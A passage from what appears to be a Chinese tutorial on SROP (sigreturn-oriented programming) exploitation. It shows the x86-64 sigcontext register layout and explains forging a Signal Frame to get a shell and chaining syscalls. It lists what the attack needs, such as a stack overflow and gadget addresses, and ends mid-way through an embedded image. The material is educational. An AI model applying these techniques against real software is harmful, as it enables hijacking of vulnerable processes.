r8;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r9;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r10;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r11;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r12;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r13;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r14;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> r15;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rdi;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rsi;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rbp;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rbx;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rdx;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rax;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rcx;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rsp;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> rip;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> eflags;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> cs;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> gs;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> fs;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">short</span> __pad0;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> err;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> trapno;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> oldmask;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> cr2;</span><br><span class=\"line\">  __extension__ <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">    &#123;</span></span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span> * <span class=\"title\">fpstate</span>;</span></span><br><span class=\"line\">      <span class=\"keyword\">__uint64_t</span> __fpstate_word;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">__uint64_t</span> __reserved1 [<span class=\"number\">8</span>];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>signal     handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。</p>\n<p><strong>攻击原理</strong></p>\n<p>仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：</p>\n<ul>\n<li>Signal  Frame被保存在用户的地址空间中，所以用户是可以读写的。</li>\n<li>由于内核与信号处理程序无关(kernel     agnostic about signal handlers)，它并不会去记录这个signal对应的Signal     Frame，所以当执行sigreturn系统调用时，此时的Signal Frame并不一定是之前内核为用户进程保存的Signal Frame。</li>\n</ul>\n<p>说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。</p>\n<p><strong>获取shell</strong></p>\n<p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息</p>\n<p>当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。</p>\n<p><strong>system call chains</strong></p>\n<p>需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</p>\n<ul>\n<li><strong>控制栈指针。</strong></li>\n<li><strong>把原来rip指向的syscall     gadget换成syscall; ret gadget。</strong></li>\n</ul>\n<p>如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的sigreturn函数调用。</p>\n<p><strong>后续</strong></p>\n<p>需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件</p>\n<ul>\n<li><p><strong>可以通过栈溢出来控制栈的内容</strong></p>\n</li>\n<li><p><strong>需要知道相应的地址</strong></p>\n</li>\n<li><ul>\n<li><strong>“/bin/sh”</strong></li>\n<li><strong>Signal      Frame</strong></li>\n<li><strong>syscal</strong></li>\n<li><strong>sigreturn</strong></li>\n</ul>\n</li>\n<li><p>需要有够大的空间来塞下整个sigal     frame</p>\n</li>\n</ul>\n<p>此外，关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：</p>\n<p>并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说Linux &lt; 3.3 x86_64（在Debian 7.0， Ubuntu Long Term Support， CentOS 6系统中默认内核），可以直接在vsyscall中的固定地址处找到syscall&amp;return代码片段。如下</p>\n<p><img src=\"data:image/png;base64,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WpeKwhrpFxERERHZA28pS9fJZfz5yj2Y8BMHFEREREQ3Ow4qyMbycObfLzFtQDsMmrsPmbxTKhEREdFNj6c/UTWo4OQVgID6jnC49pAICvOu4ELqWaRbM88FEREREd1wOKggIiIiIiKr8PQnIiIiIiKyCgcVRERERERkFQ4qiIiIiIjIKhxUEBERERGRVTioICIiIiIiq3BQQUREREREVuGggoiIiIiIrMJBBRERERERWYWDCiIiIiIisgoHFUREREREZBUOKoiIiIiIyCocVBARERERkVU4qCAiIiIiIqtwUEFERERERFbhoIKIiIiIiKzCQQUREREREVmFgwoiIiIiIrIKBxVERERERGQVDiqIiIiIiMgqHFQQEREREZFVOKggIiIiIiKrcFBBRERERERW4aCCiIiIiIiswkEFERERERFZhYMKIiIiIiKyCgcVRERERERkFQ4qiIiIiIjIKhxUEBERERGRVTioICIiIiIiq3BQQUREREREVuGggoiIiIiIrMJBBRERERERWYWDCiIiIiIisgoHFUREREREZBUOKoiIiIiIyCocVBARERERkVU4qCAiIiIiIqtwUEFERERERFbhoIKIiIiIiKzCQQUREREREVmFgwoiIiIiIrKKxt4dICIi2+gIQGfvTtzijgM4b+9OEBHZAQcVREQ3gT8A3G7vThAKADwAYIO9O0JEVMN4+hMR0Q2uDTigqC00AB6zdyeIiOyAgwoiohuck707QOU427sDRER2wNOfiIhuMn0BnLR3J24xiwHcY+9OEBHZEQcVREQ3mbPFQTWH65uIbnU8/YmIiIiIiKzCQQUREREREVmFgwoiIiIiIrIKBxVERERERGQVDiqIiIiIiMgqHFQQEREREZFVOKggIiIiIiKrcFBBRERERERW4eR3RERERFTj1O4t0LmtNzRXk3HwwClkFdm7R2SNWjCoUEHXvB9GDQ9DSy8dtKocHP58LlYfySmfpWuOfqOGI6ylF3RaFXIOf46Zq48wx4IcjXsgOgY3g1vBeRw7cBjJ2RU+vSpn+HUIRWuPPCRGRyI+owBGaluOzamh0aqhQhEK9AUov4ac4N0uFO0bOyLrRDT2x1+C7XukgkarMX0IsagQBQWFsP13rgrOfh0Q2toDeYnRiIzPqP5yadwR2DEYzdwKcP7YARxOzq7QX1vVUtJOTdYCVM5+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